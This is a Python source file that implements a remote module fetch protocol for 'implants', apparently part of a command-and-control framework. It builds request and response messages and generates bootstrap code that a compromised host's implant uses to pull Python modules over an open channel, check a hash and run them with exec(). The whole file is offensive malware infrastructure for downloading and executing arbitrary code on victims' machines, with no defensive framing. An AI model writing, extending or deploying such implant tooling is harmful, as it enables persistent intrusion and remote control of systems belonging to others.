#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Minimal remote module fetch protocol for Python implants (server-side helpers)."""

from __future__ import annotations

import hashlib
import json
from dataclasses import dataclass
from typing import Any, Dict, Optional


PROTOCOL_VERSION = 1
COMMAND_FETCH_MODULE = "fetch_module"
COMMAND_LIST_MODULES = "list_modules"


@dataclass
class RemoteModuleSpec:
    module_path: str
    language: str = "python"
    version: str = "1.0.0"
    sha256: str = ""
    content: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "protocol_version": PROTOCOL_VERSION,
            "module_path": self.module_path,
            "language": self.language,
            "version": self.version,
            "sha256": self.sha256,
            "content": self.content,
        }


def compute_sha256(content: bytes) -> str:
    return hashlib.sha256(content).hexdigest()


def build_fetch_request(module_path: str, *, language: str = "python") -> Dict[str, Any]:
    return {
        "protocol_version": PROTOCOL_VERSION,
        "command": COMMAND_FETCH_MODULE,
        "module_path": str(module_path or "").strip(),
        "language": str(language or "python").strip().lower(),
    }


def build_fetch_response(spec: RemoteModuleSpec) -> str:
    return json.dumps(spec.to_dict(), separators=(",", ":"))


def parse_fetch_request(raw: str) -> Optional[Dict[str, Any]]:
    try:
        data = json.loads(raw or "{}")
    except Exception:
        return None
    if not isinstance(data, dict):
        return None
    if data.get("command") != COMMAND_FETCH_MODULE:
        return None
    return data


def build_client_bootstrap(*, var_name: str = "_kitty_remote_modules") -> str:
    """Return Python source the implant can use to request modules over an open channel."""
    return f'''
import hashlib as _h
import json as _j

{var_name} = {{"cache": {{}}}}

def _kitty_fetch_module(module_path, send_fn, recv_fn, language="python"):
    req = {{"protocol_version": {PROTOCOL_VERSION}, "command": "{COMMAND_FETCH_MODULE}", "module_path": module_path, "language": language}}
    send_fn(_j.dumps(req).encode())
    raw = recv_fn()
    if isinstance(raw, bytes):
        raw = raw.decode("utf-8", errors="replace")
    data = _j.loads(raw)
    content = data.get("content") or ""
    digest = data.get("sha256") or ""
    if digest and _h.sha256(content.encode()).hexdigest() != digest:
        raise ValueError("remote module digest mismatch")
    ns = {{}}
    exec(content, ns)
    {var_name}["cache"][module_path] = ns
    return ns
'''.strip()
